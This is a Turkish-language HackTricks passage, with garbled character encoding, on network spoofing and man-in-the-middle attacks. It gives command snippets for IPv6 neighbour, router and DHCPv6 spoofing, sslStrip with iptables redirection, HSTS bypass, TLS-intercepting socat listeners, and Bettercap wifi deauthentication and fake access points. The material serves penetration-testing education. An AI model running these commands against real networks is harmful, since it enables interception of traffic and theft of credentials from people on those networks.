### [LLMNR, NBT-NS ve mDNS SahteciliÄŸi](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Microsoft sistemleri, DNS sorgularÄ± baÅŸarÄ±sÄ±z olduÄŸunda yerel ana bilgisayar Ã§Ã¶zÃ¼mlemesi iÃ§in **Link-Local Multicast Name Resolution (LLMNR)** ve **NetBIOS Name Service (NBT-NS)**'ye gÃ¼venir. Benzer ÅŸekilde, **Apple Bonjour** ve **Linux sÄ±fÄ±r yapÄ±landÄ±rma** uygulamalarÄ±, aÄŸ iÃ§indeki sistemleri keÅŸfetmek iÃ§in **Multicast DNS (mDNS)** kullanÄ±r. Bu protokollerin kimlik doÄŸrulamasÄ±z doÄŸasÄ± ve UDP Ã¼zerinden iÅŸlem gÃ¶rmeleri nedeniyle, saldÄ±rganlar tarafÄ±ndan kÃ¶tÃ¼ niyetli hizmetlere yÃ¶nlendirmek amacÄ±yla istismar edilebilirler.

YanÄ±tlayÄ±cÄ±yÄ± kullanarak, ana bilgisayarlar tarafÄ±ndan aranan hizmetleri taklit edebilirsiniz.\
Daha fazla bilgi iÃ§in [YanÄ±tlayÄ±cÄ± ile hizmetleri taklit etme](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) sayfasÄ±nÄ± okuyun.

### [WPAD SahteciliÄŸi](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

TarayÄ±cÄ±lar genellikle **Web Proxy Auto-Discovery (WPAD)** protokolÃ¼nÃ¼ kullanarak otomatik olarak proxy ayarlarÄ±nÄ± alÄ±rlar. Bu, Ã¶zellikle "http://wpad.example.org/wpad.dat" gibi bir URL aracÄ±lÄ±ÄŸÄ±yla sunucudan yapÄ±landÄ±rma ayrÄ±ntÄ±larÄ±nÄ± almayÄ± iÃ§erir. Ä°stemcilerin bu sunucuyu keÅŸfetmesi Ã§eÅŸitli mekanizmalar aracÄ±lÄ±ÄŸÄ±yla gerÃ§ekleÅŸebilir:

* **DHCP** aracÄ±lÄ±ÄŸÄ±yla, keÅŸif Ã¶zel bir kod 252 giriÅŸi kullanÄ±larak kolaylaÅŸtÄ±rÄ±lÄ±r.
* **DNS** ile, yerel etki alanÄ±nda _wpad_ etiketli bir ana bilgisayar adÄ± aranmasÄ± iÃ§erir.
* **Microsoft LLMNR ve NBT-NS** aracÄ±lÄ±ÄŸÄ±yla, DNS sorgularÄ±nÄ±n baÅŸarÄ±sÄ±z olduÄŸu durumlarda kullanÄ±lan yedek mekanizmalar arasÄ±nda yer alÄ±r.

YanÄ±tlayÄ±cÄ± aracÄ±, **kÃ¶tÃ¼ niyetli bir WPAD sunucusu** olarak bu protokolden faydalanÄ±r. Ä°stemcileri yanÄ±ltmak iÃ§in DHCP, DNS, LLMNR ve NBT-NS'yi kullanÄ±r. YanÄ±tlayÄ±cÄ±yÄ± kullanarak hizmetlerin nasÄ±l taklit edilebileceÄŸine daha detaylÄ± olarak bakmak iÃ§in [buraya](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) gÃ¶z atÄ±n.

### [SSDP ve UPnP CihazlarÄ± SahteciliÄŸi](spoofing-ssdp-and-upnp-devices.md)

AÄŸda farklÄ± hizmetler sunarak bir kullanÄ±cÄ±yÄ± **aldatmaya** ve bazÄ± **dÃ¼z metin kimlik bilgilerini** girmesine ikna etmeye Ã§alÄ±ÅŸabilirsiniz. Bu saldÄ±rÄ± hakkÄ±nda **daha fazla bilgi iÃ§in** [**SSDP ve UPnP CihazlarÄ± SahteciliÄŸi**](spoofing-ssdp-and-upnp-devices.md)** sayfasÄ±na bakÄ±n.**

### IPv6 KomÅŸu SahteciliÄŸi

Bu saldÄ±rÄ±, ARP SahteciliÄŸi ile Ã§ok benzerdir ancak IPv6 dÃ¼nyasÄ±nda gerÃ§ekleÅŸir. KurbanÄ±, aÄŸ geÃ§idinin IPv6'sÄ±nÄ±n saldÄ±rganÄ±n MAC adresine sahip olduÄŸunu dÃ¼ÅŸÃ¼ndÃ¼rebilirsiniz.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 YÃ¶nlendirici Ä°lanÄ± SahteciliÄŸi/Floodlama

BazÄ± iÅŸletim sistemleri, aÄŸda gÃ¶nderilen RA paketlerinden varsayÄ±lan olarak aÄŸ geÃ§idini yapÄ±landÄ±rÄ±r. SaldÄ±rganÄ± IPv6 yÃ¶nlendirici olarak belirtmek iÃ§in ÅŸunlarÄ± kullanabilirsiniz:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

VarsayÄ±lan olarak bazÄ± iÅŸletim sistemleri, aÄŸdaki bir DHCPv6 paketini okuyarak DNS'i yapÄ±landÄ±rmaya Ã§alÄ±ÅŸÄ±r. Sonra, bir saldÄ±rgan kendisini DNS olarak yapÄ±landÄ±rmak iÃ§in bir DHCPv6 paketi gÃ¶nderebilir. DHCP ayrÄ±ca kurban iÃ§in bir IPv6 saÄŸlar.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (sahte sayfa ve JS kodu enjeksiyonu)

## Ä°nternet SaldÄ±rÄ±larÄ±

### sslStrip

Bu saldÄ±rÄ±nÄ±n temel olarak yaptÄ±ÄŸÄ± ÅŸey, **kullanÄ±cÄ±nÄ±n** **eriÅŸmeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±** bir **HTTP** sayfasÄ±nÄ±n **HTTPS** sÃ¼rÃ¼mÃ¼ne **yÃ¶nlendirme yapmasÄ± durumunda**, **sslStrip**'in **istemci ile** **HTTP baÄŸlantÄ±sÄ±nÄ±** ve **sunucu ile** **HTTPS baÄŸlantÄ±sÄ±nÄ±** **sÃ¼rdÃ¼rmesidir**, bÃ¶ylece baÄŸlantÄ±yÄ± **dÃ¼z metin** olarak **dinleyebilir**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Daha fazla bilgi [burada](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### HSTS'i atlatmak iÃ§in sslStrip+ ve dns2proxy

**sslStrip+ ve dns2proxy**'nin **sslStrip**'e karÅŸÄ± **farkÄ±**, Ã¶rneÄŸin _**www.facebook.com**_'u _**wwww.facebook.com**_ (ekstra "**w**" ile) **yÃ¶nlendirecek** ve bu alanÄ±n **adresini saldÄ±rgan IP** olarak ayarlayacak olmalarÄ±dÄ±r. Bu ÅŸekilde, **istemci** _**wwww.facebook.com**_ **(saldÄ±rgan)**'a baÄŸlanacak ancak **arka planda sslstrip+**, **www.facebook.com** ile https Ã¼zerinden **gerÃ§ek baÄŸlantÄ±yÄ± sÃ¼rdÃ¼recektir**.

Bu teknikteki **amaÃ§**, _**wwww**.facebook.com_ **HSTS'yi atlamak** olduÄŸundan, tarayÄ±cÄ±nÄ±n **Ã¶nbelleÄŸe alÄ±nmayacak** ÅŸekilde oluÅŸturulduÄŸundan, tarayÄ±cÄ± **facebook kimlik doÄŸrulamasÄ±nÄ± HTTP Ã¼zerinden gerÃ§ekleÅŸtirmeye kandÄ±rÄ±lacaktÄ±r**.\
Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in kurbanÄ±n baÅŸlangÄ±Ã§ta [http://www.faceook.com](http://www.faceook.com) adresine eriÅŸmeye Ã§alÄ±ÅŸmasÄ± gerekmektedir ve https deÄŸil. Bu, bir http sayfasÄ± iÃ§indeki baÄŸlantÄ±larÄ± deÄŸiÅŸtirerek yapÄ±labilir.

Daha fazla bilgi [burada](https://www.bettercap.org/legacy/#hsts-bypass), [burada](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) ve [burada](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip veya sslStrip+ artÄ±k Ã§alÄ±ÅŸmÄ±yor. Bunun nedeni tarayÄ±cÄ±larda Ã¶nceden kaydedilmiÅŸ HSTS kurallarÄ±nÄ±n olmasÄ±dÄ±r, bu yÃ¼zden bir kullanÄ±cÄ±nÄ±n "Ã¶nemli" bir alanÄ± ilk kez ziyaret etse bile HTTPS Ã¼zerinden eriÅŸecektir. AyrÄ±ca, Ã¶nceden kaydedilmiÅŸ kurallarÄ±n ve diÄŸer oluÅŸturulan kurallarÄ±n** [**`includeSubdomains`**](https://hstspreload.appspot.com) **bayraÄŸÄ±nÄ± kullanabileceÄŸini unutmayÄ±n, bu nedenle Ã¶nceki Ã¶rnekteki _**wwww.facebook.com**_ artÄ±k Ã§alÄ±ÅŸmayacak Ã§Ã¼nkÃ¼** _**facebook.com**_ **`includeSubdomains` ile HSTS kullanÄ±r.**

TODO: easy-creds, evilgrade, metasploit, factory

## Port'ta TCP dinle
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL dinleme portunda

#### AnahtarlarÄ± ve Ã¶z imzalÄ± sertifikayÄ± oluÅŸturun
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Sertifika kullanarak dinle
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Sertifika kullanarak dinle ve ana bilgisayarlara yÃ¶nlendir
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Bazen, mÃ¼ÅŸteri CA'nÄ±n geÃ§erli olup olmadÄ±ÄŸÄ±nÄ± kontrol ederse, **CA tarafÄ±ndan imzalanmÄ±ÅŸ baÅŸka bir ana bilgisayar adÄ±nÄ±n sertifikasÄ±nÄ± sunabilirsiniz**.\
BaÅŸka bir ilginÃ§ test, istenen ana bilgisayar adÄ±nÄ±n **kendi kendine imzalÄ± bir sertifikasÄ±nÄ± sunmaktÄ±r**.

Denenecek diÄŸer ÅŸeyler arasÄ±nda, geÃ§erli bir CA olmayan geÃ§erli bir sertifika ile sertifikayÄ± imzalamayÄ± denemek bulunmaktadÄ±r. Veya geÃ§erli genel anahtarÄ± kullanarak, gerÃ§ek Ã¶zel anahtarla hiÃ§bir ÅŸeyi ÅŸifrelemeye gerek olmayan bir algoritmayÄ± (Ã¶rneÄŸin diffie hellman) kullanmaya zorlamak ve istemci gerÃ§ek Ã¶zel anahtarÄ±n bir sondasÄ±nÄ± (Ã¶rneÄŸin bir hash) istediÄŸinde sahte bir sondasÄ± gÃ¶nderip istemcinin bunu kontrol etmediÄŸini ummaktÄ±r.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Aktif KeÅŸif NotlarÄ±

UDP paketi istenilen baÄŸlantÄ± noktasÄ±na sahip olmayan bir cihaza gÃ¶nderildiÄŸinde bir ICMP (Port UlaÅŸÄ±lamaz) paketi gÃ¶nderilir.

### **ARP keÅŸfi**

ARP paketleri aÄŸ iÃ§inde hangi IP'lerin kullanÄ±ldÄ±ÄŸÄ±nÄ± keÅŸfetmek iÃ§in kullanÄ±lÄ±r. Bilgisayar her olasÄ± IP adresi iÃ§in bir istek gÃ¶ndermeli ve yalnÄ±zca kullanÄ±lan IP'ler yanÄ±t verecektir.

### **mDNS (Ã§oklu DNS)**

Bettercap, **\_services\_.dns-sd.\_udp.local** iÃ§in bir MDNS isteÄŸi gÃ¶nderir (her X ms) ve bu paketi gÃ¶ren makine genellikle bu isteÄŸi yanÄ±tlar. Daha sonra, yalnÄ±zca "hizmetlere" yanÄ±t veren makineleri arar.

**AraÃ§lar**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios AdÄ± Sunucusu)**

Bettercap, "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA" adÄ±nÄ± sorarak 137/UDP baÄŸlantÄ± noktasÄ±na yayÄ±n yapar.

### **SSDP (Basit Hizmet KeÅŸif ProtokolÃ¼)**

Bettercap, tÃ¼m tÃ¼rde hizmetleri aramak iÃ§in SSDP paketlerini yayÄ±nlar (UDP BaÄŸlantÄ± NoktasÄ± 1900).

### **WSD (Web Hizmet KeÅŸfi)**

Bettercap, hizmetleri aramak iÃ§in WSD paketlerini yayÄ±nlar (UDP BaÄŸlantÄ± NoktasÄ± 3702).

## Referanslar

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network (3. baskÄ±)**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Hata Ã¶dÃ¼lÃ¼ ipucu**: **Intigriti'ye kaydolun**, hackerlar tarafÄ±ndan oluÅŸturulan bir premium **hata Ã¶dÃ¼lÃ¼ platformuna**! BugÃ¼n bize [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) katÄ±lÄ±n ve **100.000 $'a kadar Ã¶dÃ¼ller kazanmaya** baÅŸlayÄ±n!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek HackTricks ve HackTricks Cloud** github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
